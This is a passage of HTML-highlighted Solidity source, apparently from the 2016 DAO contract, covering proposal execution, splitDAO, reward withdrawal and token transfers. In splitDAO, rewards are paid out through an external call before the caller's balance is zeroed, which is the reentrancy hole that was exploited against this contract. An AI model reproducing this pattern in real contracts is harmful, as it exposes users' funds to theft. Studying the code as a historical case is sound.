        <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">open</span> <span class="o">&amp;&amp;</span> <span class="nb">now</span> <span class="o">&gt;</span> <span class="n">p</span><span class="p">.</span><span class="n">votingDeadline</span> <span class="o">+</span> <span class="n">waitPeriod</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">closeProposal</span><span class="p">(</span><span class="n">_proposalID</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Check if the proposal can be executed</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">now</span> <span class="o">&lt;</span> <span class="n">p</span><span class="p">.</span><span class="n">votingDeadline</span>  <span class="c1">// has the voting deadline arrived?</span>
            <span class="c1">// Have the votes been counted?</span>
            <span class="o">||</span> <span class="o">!</span><span class="n">p</span><span class="p">.</span><span class="n">open</span>
            <span class="c1">// Does the transaction code match the proposal?</span>
            <span class="o">||</span> <span class="n">p</span><span class="p">.</span><span class="n">proposalHash</span> <span class="o">!=</span> <span class="nf">sha3</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recipient</span><span class="p">,</span> <span class="n">p</span><span class="p">.</span><span class="n">amount</span><span class="p">,</span> <span class="n">_transactionData</span><span class="p">))</span> <span class="p">{</span>

            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// If the curator removed the recipient from the whitelist, close the proposal</span>
        <span class="c1">// in order to free the deposit and allow unblocking of voters</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isRecipientAllowed</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recipient</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">closeProposal</span><span class="p">(</span><span class="n">_proposalID</span><span class="p">);</span>
            <span class="n">p</span><span class="p">.</span><span class="n">creator</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">proposalDeposit</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kt">bool</span> <span class="n">proposalCheck</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">amount</span> <span class="o">&gt;</span> <span class="n">actualBalance</span><span class="p">())</span>
            <span class="n">proposalCheck</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>

        <span class="kt">uint</span> <span class="n">quorum</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">yea</span> <span class="o">+</span> <span class="n">p</span><span class="p">.</span><span class="n">nay</span><span class="p">;</span>

        <span class="c1">// require 53% for calling newContract()</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_transactionData</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;=</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="n">_transactionData</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x68</span>
            <span class="o">&amp;&amp;</span> <span class="n">_transactionData</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x37</span> <span class="o">&amp;&amp;</span> <span class="n">_transactionData</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xff</span>
            <span class="o">&amp;&amp;</span> <span class="n">_transactionData</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x1e</span>
            <span class="o">&amp;&amp;</span> <span class="n">quorum</span> <span class="o">&lt;</span> <span class="n">minQuorum</span><span class="p">(</span><span class="n">actualBalance</span><span class="p">()</span> <span class="o">+</span> <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]))</span> <span class="p">{</span>

                <span class="n">proposalCheck</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">quorum</span> <span class="o">&gt;=</span> <span class="n">minQuorum</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">amount</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">.</span><span class="n">creator</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">proposalDeposit</span><span class="p">))</span>
                <span class="k">throw</span><span class="p">;</span>

            <span class="n">lastTimeMinQuorumMet</span> <span class="o">=</span> <span class="nb">now</span><span class="p">;</span>
            <span class="c1">// set the minQuorum to 20% again, in the case it has been reached</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">quorum</span> <span class="o">&gt;</span> <span class="n">totalSupply</span> <span class="o">/</span> <span class="mi">5</span><span class="p">)</span>
                <span class="n">minQuorumDivisor</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Execute result</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">quorum</span> <span class="o">&gt;=</span> <span class="n">minQuorum</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">amount</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="p">.</span><span class="n">yea</span> <span class="o">&gt;</span> <span class="n">p</span><span class="p">.</span><span class="n">nay</span> <span class="o">&amp;&amp;</span> <span class="n">proposalCheck</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">.</span><span class="n">recipient</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">amount</span><span class="p">)(</span><span class="n">_transactionData</span><span class="p">))</span>
                <span class="k">throw</span><span class="p">;</span>

            <span class="n">p</span><span class="p">.</span><span class="n">proposalPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="n">_success</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

            <span class="c1">// only create reward tokens when ether is not sent to the DAO itself and</span>
            <span class="c1">// related addresses. Proxy addresses should be forbidden by the curator.</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recipient</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="p">.</span><span class="n">recipient</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="n">rewardAccount</span><span class="p">)</span>
                <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="p">.</span><span class="n">recipient</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="n">DAOrewardAccount</span><span class="p">)</span>
                <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="p">.</span><span class="n">recipient</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="n">extraBalance</span><span class="p">)</span>
                <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="p">.</span><span class="n">recipient</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="n">curator</span><span class="p">))</span> <span class="p">{</span>

                <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]</span> <span class="o">+=</span> <span class="n">p</span><span class="p">.</span><span class="n">amount</span><span class="p">;</span>
                <span class="n">totalRewardToken</span> <span class="o">+=</span> <span class="n">p</span><span class="p">.</span><span class="n">amount</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="n">closeProposal</span><span class="p">(</span><span class="n">_proposalID</span><span class="p">);</span>

        <span class="c1">// Initiate event</span>
        <span class="n">ProposalTallied</span><span class="p">(</span><span class="n">_proposalID</span><span class="p">,</span> <span class="n">_success</span><span class="p">,</span> <span class="n">quorum</span><span class="p">);</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">closeProposal</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">)</span> <span class="kr">internal</span> <span class="p">{</span>
        <span class="n">Proposal</span> <span class="n">p</span> <span class="o">=</span> <span class="n">proposals</span><span class="p">[</span><span class="n">_proposalID</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">open</span><span class="p">)</span>
            <span class="n">sumOfProposalDeposits</span> <span class="o">-=</span> <span class="n">p</span><span class="p">.</span><span class="n">proposalDeposit</span><span class="p">;</span>
        <span class="n">p</span><span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">splitDAO</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="n">_proposalID</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_newCurator</span>
    <span class="p">)</span> <span class="n">noEther</span> <span class="n">onlyTokenholders</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">Proposal</span> <span class="n">p</span> <span class="o">=</span> <span class="n">proposals</span><span class="p">[</span><span class="n">_proposalID</span><span class="p">];</span>

        <span class="c1">// Sanity check</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">now</span> <span class="o">&lt;</span> <span class="n">p</span><span class="p">.</span><span class="n">votingDeadline</span>  <span class="c1">// has the voting deadline arrived?</span>
            <span class="c1">//The request for a split expires XX days after the voting deadline</span>
            <span class="o">||</span> <span class="nb">now</span> <span class="o">&gt;</span> <span class="n">p</span><span class="p">.</span><span class="n">votingDeadline</span> <span class="o">+</span> <span class="n">splitExecutionPeriod</span>
            <span class="c1">// Does the new Curator address match?</span>
            <span class="o">||</span> <span class="n">p</span><span class="p">.</span><span class="n">recipient</span> <span class="o">!=</span> <span class="n">_newCurator</span>
            <span class="c1">// Is it a new curator proposal?</span>
            <span class="o">||</span> <span class="o">!</span><span class="n">p</span><span class="p">.</span><span class="n">newCurator</span>
            <span class="c1">// Have you voted for this split?</span>
            <span class="o">||</span> <span class="o">!</span><span class="n">p</span><span class="p">.</span><span class="n">votedYes</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span>
            <span class="c1">// Did you already vote on another proposal?</span>
            <span class="o">||</span> <span class="p">(</span><span class="n">blocked</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">!=</span> <span class="n">_proposalID</span> <span class="o">&amp;&amp;</span> <span class="n">blocked</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>  <span class="p">{</span>

            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// If the new DAO doesn&#39;t exist yet, create the new DAO and store the</span>
        <span class="c1">// current split data</span>
        <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">newDAO</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">newDAO</span> <span class="o">=</span> <span class="n">createNewDAO</span><span class="p">(</span><span class="n">_newCurator</span><span class="p">);</span>
            <span class="c1">// Call depth limit reached, etc.</span>
            <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">newDAO</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                <span class="k">throw</span><span class="p">;</span>
            <span class="c1">// should never happen</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span> <span class="o">&lt;</span> <span class="n">sumOfProposalDeposits</span><span class="p">)</span>
                <span class="k">throw</span><span class="p">;</span>
            <span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">splitBalance</span> <span class="o">=</span> <span class="n">actualBalance</span><span class="p">();</span>
            <span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">rewardToken</span> <span class="o">=</span> <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)];</span>
            <span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">totalSupply</span> <span class="o">=</span> <span class="n">totalSupply</span><span class="p">;</span>
            <span class="n">p</span><span class="p">.</span><span class="n">proposalPassed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Move ether and assign new Tokens</span>
        <span class="kt">uint</span> <span class="n">fundsToBeMoved</span> <span class="o">=</span>
            <span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">*</span> <span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">splitBalance</span><span class="p">)</span> <span class="o">/</span>
            <span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">totalSupply</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">newDAO</span><span class="p">.</span><span class="n">createTokenProxy</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="n">fundsToBeMoved</span><span class="p">)(</span><span class="nb">msg.sender</span><span class="p">)</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span>
            <span class="k">throw</span><span class="p">;</span>


        <span class="c1">// Assign reward rights to new DAO</span>
        <span class="kt">uint</span> <span class="n">rewardTokenToBeMoved</span> <span class="o">=</span>
            <span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">*</span> <span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">rewardToken</span><span class="p">)</span> <span class="o">/</span>
            <span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">totalSupply</span><span class="p">;</span>

        <span class="kt">uint</span> <span class="n">paidOutToBeMoved</span> <span class="o">=</span> <span class="n">DAOpaidOut</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]</span> <span class="o">*</span> <span class="n">rewardTokenToBeMoved</span> <span class="o">/</span>
            <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)];</span>

        <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">newDAO</span><span class="p">)]</span> <span class="o">+=</span> <span class="n">rewardTokenToBeMoved</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]</span> <span class="o">&lt;</span> <span class="n">rewardTokenToBeMoved</span><span class="p">)</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]</span> <span class="o">-=</span> <span class="n">rewardTokenToBeMoved</span><span class="p">;</span>

        <span class="n">DAOpaidOut</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">splitData</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">newDAO</span><span class="p">)]</span> <span class="o">+=</span> <span class="n">paidOutToBeMoved</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">DAOpaidOut</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]</span> <span class="o">&lt;</span> <span class="n">paidOutToBeMoved</span><span class="p">)</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="n">DAOpaidOut</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]</span> <span class="o">-=</span> <span class="n">paidOutToBeMoved</span><span class="p">;</span>

        <span class="c1">// Burn DAO Tokens</span>
        <span class="n">Transfer</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]);</span>
        <span class="n">withdrawRewardFor</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">);</span> <span class="c1">// be nice, and get his rewards</span>
        <span class="n">totalSupply</span> <span class="o">-=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">];</span>
        <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">paidOut</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">newContract</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newContract</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">msg.sender</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">allowedRecipients</span><span class="p">[</span><span class="n">_newContract</span><span class="p">])</span> <span class="k">return</span><span class="p">;</span>
        <span class="c1">// move all ether</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">_newContract</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">)())</span> <span class="p">{</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">//move all reward tokens</span>
        <span class="n">rewardToken</span><span class="p">[</span><span class="n">_newContract</span><span class="p">]</span> <span class="o">+=</span> <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)];</span>
        <span class="n">rewardToken</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">DAOpaidOut</span><span class="p">[</span><span class="n">_newContract</span><span class="p">]</span> <span class="o">+=</span> <span class="n">DAOpaidOut</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)];</span>
        <span class="n">DAOpaidOut</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">retrieveDAOReward</span><span class="p">(</span><span class="kt">bool</span> <span class="n">_toMembers</span><span class="p">)</span> <span class="kr">external</span> <span class="n">noEther</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DAO</span> <span class="n">dao</span> <span class="o">=</span> <span class="n">DAO</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">((</span><span class="n">rewardToken</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">*</span> <span class="n">DAOrewardAccount</span><span class="p">.</span><span class="n">accumulatedInput</span><span class="p">())</span> <span class="o">/</span>
            <span class="n">totalRewardToken</span> <span class="o">&lt;</span> <span class="n">DAOpaidOut</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">])</span>
            <span class="k">throw</span><span class="p">;</span>

        <span class="kt">uint</span> <span class="n">reward</span> <span class="o">=</span>
            <span class="p">(</span><span class="n">rewardToken</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">*</span> <span class="n">DAOrewardAccount</span><span class="p">.</span><span class="n">accumulatedInput</span><span class="p">())</span> <span class="o">/</span>
            <span class="n">totalRewardToken</span> <span class="o">-</span> <span class="n">DAOpaidOut</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="n">_toMembers</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DAOrewardAccount</span><span class="p">.</span><span class="n">payOut</span><span class="p">(</span><span class="n">dao</span><span class="p">.</span><span class="n">rewardAccount</span><span class="p">(),</span> <span class="n">reward</span><span class="p">))</span>
                <span class="k">throw</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DAOrewardAccount</span><span class="p">.</span><span class="n">payOut</span><span class="p">(</span><span class="n">dao</span><span class="p">,</span> <span class="n">reward</span><span class="p">))</span>
                <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">DAOpaidOut</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">+=</span> <span class="n">reward</span><span class="p">;</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">getMyReward</span><span class="p">()</span> <span class="n">noEther</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">withdrawRewardFor</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">);</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">withdrawRewardFor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_account</span><span class="p">)</span> <span class="n">noEther</span> <span class="kr">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">_success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">_account</span><span class="p">)</span> <span class="o">*</span> <span class="n">rewardAccount</span><span class="p">.</span><span class="n">accumulatedInput</span><span class="p">())</span> <span class="o">/</span> <span class="n">totalSupply</span> <span class="o">&lt;</span> <span class="n">paidOut</span><span class="p">[</span><span class="n">_account</span><span class="p">])</span>
            <span class="k">throw</span><span class="p">;</span>

        <span class="kt">uint</span> <span class="n">reward</span> <span class="o">=</span>
            <span class="p">(</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">_account</span><span class="p">)</span> <span class="o">*</span> <span class="n">rewardAccount</span><span class="p">.</span><span class="n">accumulatedInput</span><span class="p">())</span> <span class="o">/</span> <span class="n">totalSupply</span> <span class="o">-</span> <span class="n">paidOut</span><span class="p">[</span><span class="n">_account</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">rewardAccount</span><span class="p">.</span><span class="n">payOut</span><span class="p">(</span><span class="n">_account</span><span class="p">,</span> <span class="n">reward</span><span class="p">))</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="n">paidOut</span><span class="p">[</span><span class="n">_account</span><span class="p">]</span> <span class="o">+=</span> <span class="n">reward</span><span class="p">;</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_value</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">isFueled</span>
            <span class="o">&amp;&amp;</span> <span class="nb">now</span> <span class="o">&gt;</span> <span class="n">closingTime</span>
            <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isBlocked</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">)</span>
            <span class="o">&amp;&amp;</span> <span class="n">transferPaidOut</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_value</span><span class="p">)</span>
            <span class="o">&amp;&amp;</span> <span class="nb">super</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_value</span><span class="p">))</span> <span class="p">{</span>

            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">transferWithoutReward</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_value</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">getMyReward</span><span class="p">())</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="k">return</span> <span class="nf">transfer</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_value</span><span class="p">);</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_value</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">isFueled</span>
            <span class="o">&amp;&amp;</span> <span class="nb">now</span> <span class="o">&gt;</span> <span class="n">closingTime</span>
            <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isBlocked</span><span class="p">(</span><span class="n">_from</span><span class="p">)</span>
            <span class="o">&amp;&amp;</span> <span class="n">transferPaidOut</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_value</span><span class="p">)</span>
            <span class="o">&amp;&amp;</span> <span class="nb">super</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_value</span><span class="p">))</span> <span class="p">{</span>

            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">transferFromWithoutReward</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span>
        <span class="kt">uint256</span> <span class="n">_value</span>
    <span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">withdrawRewardFor</span><span class="p">(</span><span class="n">_from</span><span class="p">))</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">transferFrom</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_value</span><span class="p">);</span>
    <span class="p">}</span>


    <span class="kd">function</span> <span class="n">transferPaidOut</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span>
        <span class="kt">uint256</span> <span class="n">_value</span>
    <span class="p">)</span> <span class="kr">internal</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>

        <span class="kt">uint</span> <span class="n">transferPaidOut</span> <span class="o">=</span> <span class="n">paidOut</span><span class="p">[</span><span class="n">_from</span><span class="p">]</span> <span class="o">*</span> <span class="n">_value</span> <span class="o">/</span> <span class="n">balanceOf</span><span class="p">(</span><span class="n">_from</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">transferPaidOut</span> <span class="o">&gt;</span> <span class="n">paidOut</span><span class="p">[</span><span class="n">_from</span><span class="p">])</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="n">paidOut</span><span class="p">[</span><span class="n">_from</span><span class="p">]</span> <span class="o">-=</span> <span class="n">transferPaidOut</span><span class="p">;</span>
        <span class="n">paidOut</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">transferPaidOut</span><span class="p">;</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>


